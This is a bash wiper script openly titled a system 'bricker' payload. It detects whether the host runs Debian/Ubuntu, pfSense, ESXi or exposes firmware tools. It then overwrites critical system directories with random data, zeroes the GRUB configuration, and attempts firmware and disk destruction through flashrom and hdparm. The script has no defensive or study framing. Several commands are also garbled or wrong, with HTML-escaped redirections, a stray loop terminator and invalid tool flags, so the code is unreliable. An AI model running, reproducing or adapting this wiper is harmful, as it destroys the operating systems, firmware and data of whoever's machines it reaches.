#!/bin/bash
# DIG System Bricker Payload Script - MAXIMUM DESTRUCTION EDITION
# Executes deep destruction based on environment or specified mode.

LOG_FILE="/var/log/bricker_action.log"
echo "=========================================================" | tee -a $LOG_FILE
echo "BRICKER EXECUTION START: $(date)" | tee -a $LOG_FILE
echo "=========================================================" | tee -a $LOG_FILE

# --- Configuration & Mode Setting ---
# $1 is the FORCE_MODE. If empty, AUTO is used.
FORCE_MODE="${1:-AUTO}" 

# --- Function Definitions (The Bricking Methods) ---

# Function for Debian/Ubuntu (Linux Host)
bricker_linux() {
    echo "[LINUX MODE] Activating OS destruction sequence..." | tee -a $LOG_FILE
    CRIT_PATHS=("/etc" "/bin" "/sbin" "/lib" "/usr" "/boot" "/var")
    for target in "${CRIT_PATHS[@]}"; do
        if [ -d "$target" ]; then
            echo "  -&amp;gt; Overwriting directory: $target" | tee -a $LOG_FILE
            # Overwrite with random data recursively
            find "$target" -type f -exec dd if=/dev/urandom of={} bs=1M count=10 status=none 2&amp;amp;gt;&amp;amp;amp;1; done | tee -a $LOG_FILE
        fi
    done
    if command -v grub-mkconfig &amp;amp;amp;gt; /dev/null; then
        echo "  -&amp;gt; Corrupting GRUB configuration..." | tee -a $LOG_FILE
        dd if=/dev/zero of=/boot/grub/grub.cfg bs=1M count=5 status=none 2&amp;amp;gt;&amp;amp;amp;1 | tee -a $LOG_FILE
    fi
}

# Function for pfSense (FreeBSD Host)
bricker_pfsense() {
    echo "[PFENSE MODE] Activating Firewall/FreeBSD destruction sequence..." | tee -a $LOG_FILE
    echo "  -&amp;gt; Attempting Config Wipe..." | tee -a $LOG_FILE
    # *** USER ACTION REQUIRED: Replace this placeholder ***
    echo "  -- Placeholder: Executing pseudo-command to wipe config.xml --" | tee -a $LOG_FILE
    if mountpoint -q /; then
        echo "  -&amp;gt; Scrubbing /root filesystem..." | tee -a $LOG_FILE
        dd if=/dev/urandom of=/ -bs=1M count=20 status=none 2&amp;amp;gt;&amp;amp;amp;amp;1 | tee -a $LOG_FILE
    fi
}

# Function for ESXi (Hypervisor Destruction)
bricker_esxi() {
    echo "[ESXI MODE] Initiating Hypervisor/VM Destruction Sequence..." | tee -a $LOG_FILE
    echo "  [ATTEMPT] Executing as Guest OS (Standard Linux destruction)..." | tee -a $LOG_FILE
    bricker_linux # Fallback to guest OS wipe
    echo "  [ADVANCED] Host destruction requires PowerCLI/API calls executed externally." | tee -a $LOG_FILE
}

# Function for Firmware/Hardware Level Destruction (The Ultimate Killswitch)
bricker_hardware() {
    echo "[HARDWARE MODE] Activating Ultimate Physical/Firmware Attack..." | tee -a $LOG_FILE

    # 1. --- SYSTEM LEVEL BREAKDOWN (Ensures OS is toast) ---
    echo "  --- STAGE 1: Forcing OS and File System Damage ---" | tee -a $LOG_FILE
    bricker_linux # Always run the kernel/filesystem destruction first

    # 2. --- HARDWARE LEVEL BREAKDOWN (The Unrecoverable Finisher) ---
    echo "  --- STAGE 2: Applying Physical/Firmware Attack ---" | tee -a $LOG_FILE

    # 1. BIOS/UEFI Flash Destruction 
    if command -v flashrom &amp;amp;amp;amp;gt; /dev/null; then
        echo "  -&amp;amp;gt; Attempting flashrom overwrite (Targeting MTD chip)..." | tee -a $LOG_FILE
        # *** USER ACTION REQUIRED: Customize chip path and files ***
        flashrom -p i2c -r /path/to/backup.bin -w /path/to/junk.bin 2&amp;amp;gt;&amp;amp;amp;amp;amp;1 | tee -a $LOG_FILE
    else
        echo "  -&amp;amp;gt; flashrom not found. Cannot proceed with firmware destruction." | tee -a $LOG_FILE
    fi

    # 2. Disk Level Destruction
    if command -v hdparm &amp;amp;amp;amp;amp;gt; /dev/null; then
        echo "  -&amp;amp;gt; Attempting ATA Secure Erase on /dev/sda..." | tee -a $LOG_FILE
        hdparm -B /dev/sda PREPURGE 2&amp;amp;gt;&amp;amp;amp;amp;amp;1 | tee -a $LOG_FILE
    else
        echo "  -&amp;amp;gt; hdparm not found. Cannot proceed with disk destruction." | tee -a $LOG_FILE
    fi
}


# --- Execution Logic ---
detect_environment() {
    echo "--- Running Environment Detection ---" | tee -a $LOG_FILE

    if [ "$FORCE_MODE" != "AUTO" ]; then
        echo "--- FORCE MODE ACTIVE: $FORCE_MODE ---" | tee -a $LOG_FILE
        case "$FORCE_MODE" in
            linux)
                bricker_linux
                ;;
            pfsense)
                bricker_pfsense
                ;;
            esxi)
                bricker_esxi
                ;;
            hardware)
                bricker_hardware # This mode cascades OS destruction + hardware
                ;;
            *)
                echo "[ERROR] Invalid forced mode specified: $FORCE_MODE" | tee -a $LOG_FILE
                exit 1
                ;;
        esac
    else
        # AUTO DETECTION LOGIC (Default - Aiming for maximum system breakdown)
        if [ -f /etc/debian_version ]; then
            echo "--&amp;gt; Auto-Detected: Debian/Ubuntu"
            bricker_linux
        elif [ -f /etc/freebsd-version ]; then
            echo "--&amp;gt; Auto-Detected: pfSense/FreeBSD"
            bricker_pfsense
        elif grep -q "VMware" /proc/cpuinfo || [ -f /etc/vmware-env.sh ]; then
            echo "--&amp;gt; Auto-Detected: VMware Guest"
            bricker_esxi
        elif command -v flashrom &amp;amp;amp;amp;gt; /dev/null || command -v hdparm &amp;amp;amp;amp;gt; /dev/null; then
            echo "--&amp;gt; Auto-Detected: Hardware Attack Capable. Running full hardware wipe."
            bricker_hardware
        else
            echo "--&amp;gt; Auto-Detected: Unknown. Running fallback Linux wipe."
            bricker_linux
        fi
    fi
}

# --- Execution ---
detect_environment
exit 0
